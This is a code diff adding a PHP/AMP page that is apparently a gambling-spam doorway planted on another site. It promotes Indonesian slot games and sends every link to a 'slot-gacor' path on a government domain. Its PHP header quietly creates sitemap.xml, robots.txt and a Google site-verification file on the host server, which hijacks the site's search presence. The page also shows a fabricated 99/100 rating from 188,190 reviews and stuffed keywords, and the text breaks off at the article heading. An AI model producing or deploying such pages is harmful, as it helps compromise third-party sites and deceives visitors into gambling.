@@ -1,0 +1,586 @@
+<?php
+
+
+$CANONICAL = "http://" .
+$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$REFFERAL1='https://jambikota.bawaslu.go.id/.wp-cli/-/slot-gacor/';
+$GSCHTML='xehCUO0-etJQziL4D03Zf0-s_nGPB3UMe4HyxXZ37Qc';
+$TITLEPAGE='Demo Slot : 69 Akun Slot Demo Pragmatic Free Anti Ngelag Terlengkap Terbaru 2023';
+
+
+
+if (file_exists("sitemap.xml")){
+}else{
+$SITEMAP = fopen('sitemap.xml', 'w');
+$TEX1 = "<?xml version='1.0' encoding='UTF-8'?>
+<urlset
+      xmlns='http://www.sitemaps.org/schemas/sitemap/0.9'
+      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+      xsi:schemaLocation='http://www.sitemaps.org/schemas/sitemap/0.9
+            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd'>
+<url>
+  <loc>$CANONICAL</loc>
+  <lastmod>2023-07-26T08:43:30+00:00</lastmod>
+</url>
+
+
+</urlset>";
+fwrite($SITEMAP ,$TEX1);
+fclose($SITEMAP);}
+
+if (file_exists("googlecfddc7c2bbf14ef5.html")){
+}else{
+$GOOGLE = fopen('googlecfddc7c2bbf14ef5.html', 'w');
+$TEX2 = "google-site-verification: googlecfddc7c2bbf14ef5.html";
+fwrite($GOOGLE ,$TEX2);
+fclose($GOOGLE);}
+
+if (file_exists("robots.txt")){
+}else{
+$ROBOTS = fopen('robots.txt', 'w');
+$TEX3 = "User-agent: *
+Allow: /
+Sitemap: $CANONICAL";
+fwrite($ROBOTS ,$TEX3);
+fclose($ROBOTS);}
+
+
+?>
+<!doctype html>
+<html &#9889;>
+ <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+        <script async src="https://cdn.ampproject.org/v0.js"></script>
+        <title><?php echo $TITLEPAGE ?></title>
+        <meta name="description" content="Demo slot adalah cara tepat memainkan permainan slot terpopuler tanpa modal saat ini, link demo slot terpopuler tanpa listing berasal dari Badan Demo Pragmatic Game Indonesia.">
+        <link rel="canonical" href="<?php echo $CANONICAL ?>">
+        <meta name="keywords" content="slot demo, demo slot, slot demo pragmatic, slot demo gratis, slot demo anti lag, slot demo terlengkap, akun slot demo, demo slot gratis, slot demo tanpa deposit, slot gratis, slot demo, demo slot, slot demo pragmatic, slot demo gratis, slot demo anti lag, slot demo terlengkap, akun slot demo, demo slot gratis, slot demo tanpa deposit, slot gratis, Demo Slot Zeus Terpercaya, Agen Slot Demo Gacor, 35 Provider Slot Demo Terpopuler, Slot Zeus Easy Maxwin, Slot Demo Zeus, Agen Slot Demo Gates Of Olympus Jackpot Tertinggi Anti Rungkad, Slot Demo Gates Of Olympus, Gates Of Olympus, Slot Demo Pragmatic, 15 Daftar Permainan Slot Demo Pasti Gacor, Slot Demo PG Soft Tanpa Deposit, Anti Lag dan Terlengkap,Provider Slot Demo PG Soft, Akun Slot Demo PG Soft, Slot Demo PG Soft Mahjong Ways 2 , Slot Demo PG Soft Gratis, Provider Slot Demo Gratis Terpopuler, Provider Slot Demo Tanpa Deposit, RTP Slot Demo Gacor, Slot Demo Pragmatic,Slot Demo Pragmatic Play Full Game Anti Lag,Slot Demo Pragmatic Play Mirip Asli, User ID Slot Demo Gratis,Akun Slot Demo Pragmatic Play Gratis,Agen Demo Slot Terlengkap dan Terpopuler, Akun Slot Demo, Slot Demo Pragmatic Play, Pragmatic Play, Akun Slot Demo pragmatic,Slot Demo Gratis, Slot Demo Pragmatic Play, Demo Slot PG Soft, Demo Slot Mahjong Ways, Demo Slot Zeus, Demo Slot Bonanza, Slot Demo Pragmatic Play dan Slot Demo PG Soft,Slot Uang Asli, Agen Demo Slot,  ">
+        <meta name="robots" content="index, follow" />
+        <meta name="theme-color" content="#0a0a0a" />
+        <meta content="true" name="HandheldFriendly">
+        <meta content="width" name="MobileOptimized">
+        <meta name="apple-mobile-web-app-status-bar-style" content="default"/>
+        <meta name="apple-mobile-web-app-capable" content="yes"/>
+        <meta name="mobile-web-app-capable" content="yes"/>
+        <meta name="language" content="ID">
+        <meta name="copyright" content="Slot Demo">
+        <meta name="author" content="Slot Demo">
+        <meta name="distribution" content="global">
+        <meta name="publisher" content="Slot Demo">
+        <meta name="geo.placename" content="DKI Jakarta">
+        <meta name="geo.country" content="ID">
+        <meta name="geo.region" content="ID" />
+        <meta name="tgn.nation" content="Indonesia">
+        <!-- OG:FACEBOOK -->
+        <meta property="og:locale" content="id_ID" />
+        <meta property="og:type" content="website" />
+        <meta property="og:title" content="Demo Slot : 13 Akun Slot Demo Pragmatic Gratis Anti Lag Terlengkap Terbaru 2023" />
+        <meta property="og:description" content="Demo slot adalah cara tepat memainkan permainan slot terpopuler tanpa modal saat ini, link demo slot terpopuler tanpa listing berasal dari Badan Demo Pragmatic Game Indonesia. " />
+        <meta property="og:url" content="<?php echo $CANONICAL ?>" />
+        <meta property="og:site_name" content="Slot Demo" />
+        <meta property="article:modified_time" content="2023-05-29T06:57:10+00:00" />
+        <meta property="og:image" content="https://res.cloudinary.com/dsv8be899/image/upload/v1692341600/GOODSLOT222_tlgxud.png" />
+        <meta property="og:image:width" content="325" />
+        <meta property="og:image:height" content="234" />
+        <meta property="og:image:type" content="image/jpg" />
+        <!-- OG:TWITTER -->
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:title" content="Demo Slot : 13 Akun Slot Demo Pragmatic Gratis Anti Lag Terlengkap Terbaru 2023" />
+        <meta name="twitter:description" content="Demo slot adalah cara tepat memainkan permainan slot terpopuler tanpa modal saat ini, link demo slot terpopuler tanpa listing berasal dari Badan Demo Pragmatic Game Indonesia. " />
+        <meta name="twitter:image" content="https://res.cloudinary.com/dsv8be899/image/upload/v1692341600/GOODSLOT222_tlgxud.png" />
+        <meta name="twitter:site" content="@slotdemo" />
+        <meta name="twitter:creator" content="@slotdemo" />
+        <meta name="twitter:label1" content="Estimasi waktu membaca" />
+        <meta name="twitter:data1" content="12 menit" />
+        <link rel="preload" as="image" href="https://i.ibb.co/9hxJTk5/logo-slot-demo1.png" />
+        <link rel="preload" as="image" href="https://res.cloudinary.com/dsv8be899/image/upload/v1692341600/GOODSLOT222_tlgxud.png" />
+        <meta name="supported-amp-formats" content="websites, stories, ads, email">
+        <link href="https://www.svgrepo.com/show/474370/crown-user.svg" rel="shortcut icon" type="image/x-icon" />
+        <link rel="apple-touch-icon-precomposed" href="https://www.svgrepo.com/show/474370/crown-user.svg" />
+        <script async custom-element="amp-anim" src="https://cdn.ampproject.org/v0/amp-anim-0.1.js"></script>
+        <script async custom-element="amp-carousel" src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js"></script>
+        <script async custom-element="amp-accordion" src="https://cdn.ampproject.org/v0/amp-accordion-0.1.js"></script>
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" type="text/css"/>
+        <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;700&display=swap" rel="stylesheet">
+        <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+        <style amp-custom>*{box-sizing:border-box}body{background-color:#000;color:#fff;font-family:rubik,sans-serif}header{background-color:#222;box-shadow:0 0 9px 2px hsl(0deg 0% 4% / 48%)}header .header-wrapper{margin:0 auto;max-width:960px}header .header-wrapper .logo{display:flex;justify-content:center;position:relative;padding:15px 0}nav{background-color:#222;border-bottom:5px solid #054487}nav .menu{position:relative}nav .menu ul{list-style-type:none;position:relative;margin:0;padding:0}nav .menu ul li{color:#fff;display:inline-block}nav .menu ul li a{color:#fff;text-decoration:none;padding:10px 15px;display:inline-block}.active{background:-webkit-linear-gradient(top,#0e0d0d 0%,#054487 100%)}.container{margin:0 auto;max-width:960px}.content{margin:15px 0;padding:5px}.text-center{text-align:center}.title{background-color:#222;padding:15px;font-size:17px}.thumbs{position:relative;padding-top:5px}.btn-body{margin:15px 0;position:relative;display:flex}.btn-body .btn-items{margin:0 5px;width:100%}.btn-body .btn-items a{text-decoration:none;width:100%;padding:10px 5px;color:#fff;background:-webkit-linear-gradient(top,#0e0d0d 0%,#054487 100%);border-radius:5px;display:inline-block;text-align:center;overflow:hidden;position:relative}.btn-body .btn-items a::before{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background-color:#ad8585;opacity:0;-webkit-transition:0.2s opacity ease-in-out;transition:0.2s opacity ease-in-out}.btn-items a span{position:absolute}.btn-items a span:nth-child(1){top:0;left:0;width:100%;height:39px;background:-webkit-gradient(linear,right top,left top,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to left,rgba(43,8,8,0),#fff);-webkit-animation:2s animateTop linear infinite;animation:2s animateTop linear infinite}.btn-items a span:nth-child(2){top:0;right:0;height:100%;width:3px;background:-webkit-gradient(linear,left bottom,left top,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to top,rgba(43,8,8,0),#fff);-webkit-animation:2s animateRight linear -1s infinite;animation:2s animateRight linear -1s infinite}.btn-items a span:nth-child(3){bottom:0;left:0;width:100%;height:3px;background:-webkit-gradient(linear,left top,right top,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to right,rgba(43,8,8,0),#fff);-webkit-animation:2s animateBottom linear infinite;animation:2s animateBottom linear infinite}.btn-items a span:nth-child(4){top:0;left:0;height:100%;width:3px;background:-webkit-gradient(linear,left top,left bottom,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to bottom,rgba(43,8,8,0),#fff);-webkit-animation:2s animateLeft linear -1s infinite;animation:2s animateLeft linear -1s infinite}.sticky-bottom-menu .menu-items.menu-login .menu-icons{position:absolute;top:0;top:-62px;right:0;left:0;width:70px;height:70px;border-radius:50px;background-color:#0000ff;border:3px solid #f3db00;display:flex;align-items:center;justify-content:center;margin:auto;-webkit-animation:beat 0.5s infinite alternate;animation:beat 0.5s infinite alternate}.sticky-bottom-menu .menu-items.menu-login .menu-icons i{font-size:30px;border-radius:50px;color:#f3db00}.box-games-wrapper{display:flex;flex-direction:row;flex-wrap:wrap}.box-games-wrapper .box-games{width:150px;margin:15px 5px}.box-games-wrapper .box-games .games-img{position:relative;overflow:hidden;padding:7px}.box-games-wrapper .box-games .games-name{font-size:12px;background-color:#222;padding:10px 5px;text-align:center;font-weight:500}.box-text{padding:5px}.box-text a{text-decoration:none;color:hsl(46,100%,56%)}.content table{width:100%;border-collapse:collapse}.box-text table{width:100%;text-align:center;border-collapse:separate;border:1px solid #fff}.content table th,.content table td{padding:8px;border:2px solid #054487}.content table th{background:#054487 linear-gradient(180deg,#0a0909,#054487) repeat-x;text-shadow:0 1px 3px rgb(0 0 0 / 75%)}.content table{width:100%;border-collapse:collapse}.box-text table th,td{border:1px solid #fff;padding:5px}.mt-50{margin-top:50px}footer{padding:15px 5px}footer .footer-text{text-align:center}.sticky-bottom-menu{background:#0000ff;color:#fff;position:fixed;bottom:0;right:0;left:0;z-index:997;display:grid;grid-template-columns:repeat(5,1fr);border-top:2px solid #054487}.sticky-bottom-menu .menu-items{text-align:center;padding:12px 5px 8px;color:#fff;position:relative;text-decoration:none}.sticky-bottom-menu .menu-items .menu-icons{position:relative}.sticky-bottom-menu .menu-items .menu-icons i{font-size:20px}.sticky-bottom-menu .menu-items.menu-login{position:relative;z-index:999;align-self:flex-end}@keyframes beat{to{transform:scale(1.2)}}@keyframes animateTop{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(-100%);transform:translateX(-100%)}}@keyframes animateRight{0%{-webkit-transform:translateY(100%);transform:translateY(100%)}100%{-webkit-transform:translateY(-100%);transform:translateY(-100%)}}@keyframes animateLeft{0%{-webkit-transform:translateY(-100%);transform:translateY(-100%)}100%{-webkit-transform:translateY(100%);transform:translateY(100%)}}@keyframes animateBottom{0%{-webkit-transform:translateX(-100%);transform:translateX(-100%)}100%{-webkit-transform:translateX(100%);transform:translateX(100%)}}@media only screen and (max-width:720px){.box-games-wrapper{justify-content:center}.box-games-wrapper .box-games{width:45%}nav .menu ul li{display:block;text-align:center}nav .menu ul li a{width:100%}}</style>
+        <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+        <script type="application/ld+json">
+            {
+                "@context": "https://schema.org",
+                "@type": "Game",
+                "name": "Slot Demo Terlengkap",
+                "author": {
+                    "@type": "Person",
+                    "name": "Slot Demo"
+                },
+                "headline": "Demo Slot : 13 Akun Slot Demo Pragmatic Gratis Anti Lag Terlengkap Terbaru 2023",
+                "description": "Demo slot adalah cara tepat memainkan permainan slot terpopuler tanpa modal saat ini, link demo slot terpopuler tanpa listing berasal dari Badan Demo Pragmatic Game Indonesia. ",
+                "keywords": [
+                    "slot demo, demo slot, slot demo pragmatic, slot demo gratis, slot demo anti lag, slot demo terlengkap, akun slot demo, demo slot gratis, slot demo tanpa deposit, slot gratis"
+                ],
+                "image": "https://i.ibb.co/9hxJTk5/logo-slot-demo1.png",
+                "url": "<?php echo $CANONICAL ?>",
+                "publisher": {
+                    "@type": "Organization",
+                    "name": "Slot Demo"
+                },
+                "aggregateRating": {
+                    "@type": "AggregateRating",
+                    "ratingValue": "99",
+                    "bestRating": "100",
+                    "worstRating": "0",
+                    "ratingCount": "188190"
+                },
+                "inLanguage": "id-ID"
+            }
+        </script>
+        <script type="application/ld+json">
+            {
+                "@context": "https://schema.org",
+                "@type": "Article",
+                "mainEntityOfPage": {
+                    "@type": "WebPage",
+                    "@id": "<?php echo $CANONICAL ?>"
+                },
+                "headline": "Demo Slot : 13 Akun Slot Demo Pragmatic Gratis Anti Lag Terlengkap Terbaru 2023",
+                "image": [
+                    "https://res.cloudinary.com/dsv8be899/image/upload/v1692341600/GOODSLOT222_tlgxud.png"
+                    ],
+                "datePublished": "2023-05-29T06:57:10+00:00",
+                "dateModified": "2023-05-29T06:57:10+00:00",
+                "author": {
+                    "@type": "Person",
+                    "name": "Slot Demo",
+                    "url": "<?php echo $CANONICAL ?>"
+                    },
+                "publisher": {"@type": "Organization",
+                    "name":"Slot Demo",
+                    "logo": {
+                        "@type": "ImageObject",
+                        "url": "https://i.ibb.co/9hxJTk5/logo-slot-demo1.png"
+                    }
+                }
+            }
+            </script>
+    </head>
+    <body>
+        <header>
+            <div class="header-wrapper">
+                <div class="logo">
+                    <a href="<?php echo $CANONICAL ?>">
+                        <amp-img src="https://i.ibb.co/9hxJTk5/logo-slot-demo1.png" width="200" height="70" alt="Slot Demo Pragmatic" layout="fixed"></amp-img>
+                    </a>
+                </div>
+            </div>
+        </header>
+        <nav role="navigation">
+            <div class="container">
+                <div class="menu">
+                    <ul>
+                        <li><a href="<?php echo $CANONICAL ?>" class="active"><b>Slot Demo Pragmatic</b></a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <section class="content">
+            <div class="container">
+                <div class="title">
+                    Akun Slot Demo Pragmatic Gratis
+                </div>
+                <div class="thumbs">
+                    <amp-img src="https://res.cloudinary.com/dsv8be899/image/upload/v1692341600/GOODSLOT222_tlgxud.png" width="640" height="300" alt="slot demo pragmatic maxwin" layout="responsive"></amp-img>
+                </div>
+                <div class="btn-body">
+                    <div class="btn-items">
+                      <a href="<?php echo $REFFERAL1 ?>" rel="nofollow noreferrer"  target="_blank" title="Daftar slot gacor"><span></span><span></span><span></span><span></span><b>DAFTAR SLOT GACOR</b></a>
+                    </div>
+                  </div>
+                <section class="content">
+                    <table>
+                        <tbody>
+                            <tr>
+                                <th colspan="2">Informasi Slot Demo Gratis</th>
+                            </tr>
+                            <tr>
+                                <td>&#11088;&#65039; Nama Situs</td>
+                                <td>Slot Demo&#10004;&#65039;</td>
+                            </tr>
+                            <tr>
+                                <td>&#11088;&#65039; Situs</td>
+                                <td>Sarjana Toto online&#10004;&#65039;</td>
+                            </tr>
+                            <tr>
+                                <td>&#11088;&#65039; Slot Demo Gratis</td>
+                                <td>Gates Of Olympus&#10004;&#65039;, Sweet Bonanza&#10004;&#65039;, Gates Of Gatotkaca&#10004;&#65039;</td>
+                            </tr>
+                            <tr>
+                                <td>&#11088;&#65039; Fitur Demo Slot</td>
+                                <td>Slot Demo Terlengkap dan Gratis&#10004;&#65039;</td>
+                            </tr>
+                            <tr>
+                                <td>&#11088;&#65039; Versi Game Slot</td>
+                                <td>Akun Demo Slot Gratis, Dan Slot Demo Gacor&#10004;&#65039;</td>
+                            </tr>
+                            <tr>
+                                <td>&#11088;&#65039; Support Gameplay</td>
+                                <td>PC , Mobile (Android & IOS), Tablet&#10004;&#65039;</td>
+                            </tr>
+                        </tbody>
+                    </table>
+            </section>
+            <div class="box-games-wrapper">
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/ssbt421/gatot-kaca-slot.png" width="148" height="148" layout="responsive" alt="Gates Of Gatot Kaca"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Gates Of Gatot Kaca
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/1LqYcnV/vs20schristmas.jpg" width="148" height="148" layout="responsive" alt="Starlight Christmas"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Starlight Christmas
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img"><a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                        <amp-img src="https://i.ibb.co/5BvBD7b/gates-of-olympus.png"width="148" height="148" layout="responsive" alt="Gates OfOlympus"></amp-img></a></div><div class="games-name">
+                            Gates Of Olympus
+                    </div>
+                </div><div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/PMRj60s/starlight-princess.png" width="148" height="148" layout="responsive" alt="Starlight Princess"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Starlight Princess
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/Jnn4S3k/sweet-bonanza.png" width="148" height="148" layout="responsive" alt="Sweet Bonanza"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Sweet Bonanza
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/wy3pjQd/sweet-bonanza-xmas.png" width="148" height="148" layout="responsive" alt="Sweet Bonanza Xmas"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Sweet Bonanza Xmas</div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/6ndrQCr/bonanza-gold.webp" width="148" height="148" layout="responsive" alt="Bonanza Gold"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Bonanza Gold
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/dK409Z8/wild-west-gold.png" width="148" height="148" layout="responsive" alt="Wild West Gold"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Wild West Gold
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/6XjBQ39/wild-west-gold-megaways.jpg" width="148" height="148" layout="responsive" alt="Wild West Gold Megaways"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Wild West Gold Megaways
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/0CHFJMy/aztec-gems.webp" width="148" height="148" layout="responsive" alt="Aztec Gems"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Aztec Gems
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/wWNQ2xs/pyramid-bonanza.png" width="148" height="148" layout="responsive" alt="Pyramid Bonanza"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Pyramid Bonanza
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/Xs9GJxZ/mahjong-panda.webp" width="148" height="148" layout="responsive" alt="Mahjong Panda"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Mahjong Panda</div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/FXXWkJv/Spaceman.png" width="148" height="148" layout="responsive" alt="SpaceMan"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        SpaceMan
+                    </div></div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/9w9Dmw3/thor.png" width="148" height="148" layout="responsive" alt="Power Of Thor Megaways"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Power Of Thor
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/Czg5NH1/bomb-bonanza.webp" width="148" height="148" layout="responsive" alt="Bomb Bonanza"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Bomb Bonanza
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/hZx738Z/coffe-wild.webp" width="148" height="148" layout="responsive" alt="Coffe Wild"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Coffe Wild
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/8xDBLfG/rise-of-samurai-3.webp" width="148" height="148" layout="responsive" alt="Rise Of Samurai 3"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">Rise Of Samurai 3</div></div>
+                <div class="box-games">
+                    <div class="games-img"><a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/wN6v9TC/jokers-jewels.png" width="148" height="148" layout="responsive" alt="Joker's Jewels"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Joker's Jewels
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/fFWY4Cp/candy-village.png" width="148" height="148" layout="responsive" alt="Candy Village"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Candy Village
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/d2nTGHM/wild-beach-party.png" width="148" height="148" layout="responsive" alt="Wild Beach Party"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Wild Beach Party
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/vhMX5pf/fruit-party.png" width="148" height="148" layout="responsive" alt="Fruit Party"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Fruit Party
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/894SNWc/fruit-party-2.png" width="148" height="148" layout="responsive" alt="Fruit Party 2"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Fruit Party 2
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/jHFXV8J/hand-of-midas.webp" width="148" height="148" layout="responsive" alt="Fire Strike"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Hand of Midas
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/CB4n7Ch/fire-strike.webp" width="148" height="148" layout="responsive" alt="Fire Strike"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        FireStrike
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/rkvTXHg/fire-strike-2.jpg" width="148" height="148" layout="responsive" alt="Fire Strike 2"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Fire Strike 2
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/gMwX8h0/eye-of-cleopatra.jpg" width="148" height="148" layout="responsive" alt="Eye of Cleopatra"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Eye of Cleopatra
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/4f1hmPr/diamond-strike.webp" width="148" height="148" layout="responsive" alt="Diamond Strike"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Diamond Strike
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/vzR7Pbg/lucky-lightning.jpg" width="148" height="148" layout="responsive" alt="Lucky Lightning"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Lucky Lightning
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/DrqLMMZ/Emperor-Caishen.jpg" width="148" height="148" layout="responsive" alt="Emperor Caishen"></amp-img>
+                        </a>
+                    </div>
+                    <div class="games-name">
+                        Emperor Caishen
+                    </div>
+                </div>
+                <div class="box-games">
+                    <div class="games-img">
+                        <a href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow noopener noreferrel">
+                            <amp-img src="https://i.ibb.co/rvWvCVR/queenie.jpg" width="148" height="148" layout="responsive" alt="Queenie"></amp-img>
+                        </a></div>
+                    <div class="games-name">
+                        Queenie
+                    </div>
+                </div>
+                </div>
+            </div></section>
+        <article>
+            <div class="container"><div class="box-text">
+                 <!--GANTI ARTIKEL-->
+                 <h1 style="text-align: center;"><span style="color: #666699;">Demo Slot : 13 Akun Slot Demo Pragmatic Gratis Anti Lag Terlengkap Terbaru 2023</span></h1>
